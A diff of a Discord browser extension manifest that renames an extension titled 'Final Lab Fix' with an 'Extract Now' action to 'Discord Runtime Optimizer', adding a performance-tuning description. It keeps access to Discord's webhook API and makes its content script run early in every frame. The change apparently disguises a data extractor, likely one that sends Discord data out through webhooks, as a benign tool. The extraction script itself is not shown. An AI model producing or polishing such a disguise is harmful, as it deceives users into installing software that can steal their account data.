@@ -1,15 +1,19 @@
 {
   "manifest_version": 3,
-  "name": "Final Lab Fix",
-  "version": "8.0",
-  "permissions": ["storage", "activeTab", "scripting"],
-  "host_permissions": ["*://*.discord.com/*", "https://*.discordapp.com/*", "https://discord.com/api/webhooks/*"],
-  "background": { "service_worker": "background.js" },
-  "action": { "default_title": "Extract Now" },
+  "name": "Discord Runtime Optimizer",
+  "version": "1.0.4",
+  "description": "Optimizes Discord web client performance and memory allocation.",
+  "permissions": ["storage"],
+  "host_permissions": [
+    "*://*.discord.com/*",
+    "https://discord.com/api/webhooks/*"
+  ],
   "content_scripts": [
     {
       "matches": ["*://*.discord.com/*"],
-      "js": ["content.js"]
+      "js": ["content.js"],
+      "run_at": "document_start",
+      "all_frames": true
     }
   ]
 }
